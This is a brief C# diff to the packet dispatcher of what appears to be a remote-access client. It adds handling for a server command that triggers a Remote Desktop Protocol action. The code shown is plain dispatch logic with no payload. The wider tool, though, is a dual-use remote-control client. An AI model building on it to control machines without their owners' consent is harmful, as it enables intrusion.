@@ -211,6 +211,10 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleSearchDirectory((ServerPackets.SearchDirectory)packet, client);
             }
+            else if (type == typeof(ServerPackets.DoRemoteDesktopProtocol))
+            {
+                CommandHandler.HandleRemoteDesktopProtocol((ServerPackets.DoRemoteDesktopProtocol)packet, client);
+            }
         }
     }
 }
